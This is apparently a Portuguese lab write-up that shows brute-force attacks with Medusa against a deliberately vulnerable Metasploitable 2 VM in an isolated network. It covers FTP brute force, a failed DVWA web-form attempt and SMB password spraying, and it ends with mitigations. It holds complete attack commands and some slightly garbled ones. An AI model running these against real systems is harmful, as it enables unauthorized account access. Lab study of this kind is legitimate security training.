# Brute-Force-Attack
Este projeto tem fins educacionais e demonstra, na prática, como realizar ataques de força bruta em serviços vulneráveis (FTP, SMB e formulário web) utilizando o Kali Linux e a ferramenta Medusa. O ambiente alvo é o Metasploitable 2, propositalmente vulnerável, rodando em uma rede isolada (Host-Only) no VirtualBox. O objetivo é compreender as táticas de ataque e, principalmente, aprender as medidas de mitigação para proteger sistemas reais.

## Índice
- [Configuração do Ambiente](#configuração-do-ambiente)
- [Preparação das Wordlists](#preparação-das-wordlists)
- [Cenários de Ataque](#cenários-de-ataque)
    - [1. FTP - Força Bruta com Medusa](#1-ftp--força-bruta-com-medusa)
    - [2. Formulário Web (DVWA)](#2-formulário-web-dvwa)
    - [3. SMB - Password Spraying](#3-smb--password-spraying)
 - [Resultados Obtidos](resultados-e-boas-práticas)
 - [Conclusão](#conclusão)


## Configuração do Ambiente
  
- Oracle VirtualBox
    - Máquinas Virtuais:
    - Atacante: Kali Linux
    - Alvo: Metasploitable 2 (Linux Ubunto)
- Rede: Adaptador Host-Only


# Preparação das Wordlists
Foram criadas listas simples baseadas em credenciais padrão conhecidas do Metasploitable

Criando estrutura de diretórios
mkdir -p ~/medusa-lab/{wordlists,results}
cd ~/medusa-lab

Lista de usuários
nano wordlists/users.txt

Lista de senhas
nano wordlists/passwords.txt

# Cenários de Ataque

## 1. FTP-Força Bruta com Medusa
Enumeração do serviço

nmap -p -sV 192.168.56.101

saída:
PORT    STATE  SERVICE  VERSION

21/tcp  open   ftp      vsftpd 2.3.4

Ataque com Medusa:
medusa -h 192.168.56.101 -U wordlists/users.txt -P wordlists/passwords.txt -M ftp -n 21 -f -O results/medusa_ftp.txt

Resultado:
cat results/medusa_ftp.txt
ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]


Validação do acesso:
ftp 192.168.56.101
user: msfadmin
password: msfadmin
ftp> ls
(diretórios listados)
ftp> quit


## 2. Formulário Web (DVWA)
O DVWA (Damn Vulnerable Web Application) está disponível no Metasploitable em http://192.168.56.101/dvwa. Antes do ataque, o nível de segurança foi alterado para "low" (via interface web) para desabilitar proteções como tokens CSRF.

Identificando a mensagem de falha:
- Acessei o formulário de login e tentei uma credencial qualquer (ex: admin:123)
- Utilizei as Ferramentas do Desenvolvedor do navegador (aba Network) para Inspecionar a requisição POST
- A resposta do servidor para credenciais inválidas exibia a mensagem "Login failed"
- Essa mensagem foi usada para como parâmetro de falha no comando do Medusa


Tentativa de ataque com Medusa:
medusa -h 192.168.56.101 -U wordlists/users.txt -P wordlists/passwords.txt \
-M http -m PAGE:"/dvwa/login.php" \
-m FORM:"username=^USER^&password=^PASS^&Login=Login" \
-m FAIL:"Login failed" \
-t 6 -O results/medusa_dvwa.txt

Resultado Inesperado:
Após diversas tentativas e ajustes nos parêmetros (incluindo a troca do nível de segurança DVWA), o MEdusa não conseguiu encontrar a credencial correta (admin:password) de forma confiável. Em algumas execuções, ele retornou poucos resultados, mas sem sucesso claro.

Em algumas pesquisas:
Descobri que o módulo http do Medusa tem limitações para lidar com sessões e cookies, comuns em aplicações web como o DVWA. Embora o comando acima seja teoricamente correto, a ferramenta pode não interpretar adequadamente a resposta do servidor ou manter o estado da sessão. Por isso. em cenários reais de teste de intrusão web, ferramentas como Hydra ou Burp Suite são mais recomendadas.

Com esse desafio, pude aprender:
Ataques a formulários web exigem compreensão do contexto da aplicação (cookies, tokens, redirecionamentos) e que nem toda ferramenta de força bruta é adequada para os cenários. A tentativa com Medusa, mesmo não tendo sido totalmente bem sucedida, foi válida para demonstrar essa limitação e a importância de escolher a ferramenta correta.


## 3. SMB-Password Spraying
Nesta técnica, utilizamos uma única senha contra uma lista de usuários válidos, evitando bloqueios por múltiplas tentativas com o memo usuário

Enumeração de usuários SMB com enum4linux:
enum4linux -U 192.168.56.101 | tee results/enum4linux.txt

A partir dessa saída, extraí os seguintes usuários e criei uma wordlist específica
nano wordlists/smb_users.txt

Ataque de password spraying com Medusa (usando a senha msfadmin)
medusa -h 192.168.101 -U wordlists/smb_users.txt -p msfadmin -M smbnt -f -O results/medusa_smb.txt

Resultado:
cat results/medusa_smb.txt
ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]

Conclusão dos testes:
O ambiente Metasploitable 2 confirmou-se extremamente vulnerável devido ao uso de credenciais padrão e serviços desnecessários expostos. O ataque ao DVWA evidenciou a importância de escolher a ferramenta adequada para cada contexto.


# Mitigações e Boas Práticas

Com base nos ataques simulados, recomenda-se:

- Políticas de senhas fortes: exigir senhas longas e complexas, evitanto palavras comuns e com,binações previsíveis.
- Bloqueio de conta (Account Lockout): configurar o sistema para bloquear temporariamente a conta após um número específico de tentativas (ex: 3 tentativas).
- Rate Limiting: limitar o número de tentativas de login por IP em um determinado período, especialmente em formulários web.
- Autenticação multifator (MFA): implementar uma segunda Camada de verificação, tornando a senha insuficiente para o acesso.
- Desabilitar serviços desnecessários: remover ou desativar serviços como FTP e SMB se não forem estritamente necessários. No caso do SMB, desabilitar a enumeração anônima de usuários.
- Monitoramento com fail2ban: implementar sistemas como fail2ban para detectar e bloquear automaticamente padrões de ataque de autenticação.
- Atualizações constantes: manter sistemas e aplicações atualizadas para corrigir vulnerabilidades conhecidas


# Conclusão
Este projeto prático permitiu vivenciar, em ambiente controlado, técnicas reais de ataque de força bruta. Foi possível compreender como ferramentas como Medusa automatizam tentativas de login e como serviços mal configurados podem ser explorados. Mais importante, as medidas de mitigação discutidas destacam a necessidade de adotar uma postura proativa de segurança, combinando políticas de senhas, monitoramento e hardening de sistemas.

O conhecimento adquirido é essencial para qualquer profissional de segurança que deseja não apenas atacar, mas proteger eficazmente ambientes corporativos.
